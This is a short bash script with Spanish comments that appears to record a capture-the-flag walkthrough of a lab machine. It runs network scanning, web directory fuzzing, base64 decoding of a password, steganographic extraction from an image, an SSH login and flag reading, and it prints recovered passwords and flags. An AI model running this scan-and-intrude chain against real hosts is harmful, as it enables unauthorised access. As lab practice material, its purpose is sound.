
```bash
#!/bin/bash
arp-scan -I wlan0 --localnet #Saca todas las ip conectadas a la red
ping -c 1 192.168.1.134 #Hacemos un ping para ver si existe conectividad
nmap -p- --open -sS -sC -sV --min-rate 2500 -n -vvv -Pn 192.168.1.134 -oN escaneo #Abiertos puerto 22 ssh
#Abierto puerto 80 http debido a esto miraremos la ip objetivo en google para ver el contenido de la web en cuestion
whatweb http://192.168.1.134/ #Con este comando miramos sobre que está echa la web
curl http://192.168.1.134/ #Con esto vemos el codigo fuente de la maquina
wfuzz -c --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u http://192.168.1.134/ #Vemos que existe el directorio img
echo 'UzRsdjBDMG5EdUN0MCE=' | base64 -d #Desencriptamos el codigo en base64 y obtenemos S4lv0C0nDuCt0!
wget http://10.0.2.6/img/pepe_the_frog.jpg #Para obtener la imagen
steghide extract -sf pepe_the_frog.jpg #Aplicamos esteganografia y nos extrae el salvoconducto.txt
ssh pepethefrog@10.0.2.6 #Con esto entramos a la maquina siendo usuario 
cat user.txt #Realizamos un cat y vemos la flag de user 3nh0r4bu3n4us3rp3p3!
cat .bash_none #Realizamos un cat y vemos la flag de root S1s3n0r3r3sunf13r4!
```